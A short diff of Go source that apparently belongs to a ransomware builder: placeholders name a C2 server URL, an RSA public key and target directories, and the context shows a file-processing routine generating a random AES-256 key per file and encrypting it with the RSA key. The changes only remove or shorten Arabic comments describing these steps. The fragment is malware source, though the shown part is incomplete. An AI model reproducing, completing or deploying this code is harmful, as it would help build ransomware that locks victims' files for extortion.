@@ -20,7 +20,6 @@ const C2ServerUrl = "__C2_SERVER_URL__"
 const PublicKeyPEM = "__PUBLIC_KEY__"
 const TargetDirsString = "__TARGET_DIRECTORIES__"
 
-// توليد مفتاح AES عشوائي لكل ملف أو جلسة
 func generateAESKey() ([]byte, error) {
 	key := make([]byte, 32) // AES-256
 	_, err := rand.Read(key)
@@ -97,7 +96,6 @@ func processFiles() {
 					return nil
 				}
 
-				// 1. إنشاء مفتاح AES عشوائي لتشفير الملف
 				aesKey, err := generateAESKey()
 				if err != nil {
 					return nil
@@ -108,7 +106,7 @@ func processFiles() {
 					return nil
 				}
 
-				// 2. تشفير مفتاح AES باستخدام RSA العام
+				// تشفير مفتاح AES باستخدام RSA العام
 				encryptedKey, err := encryptRSA(aesKey, pubKey)
 				if err != nil {
 					return nil
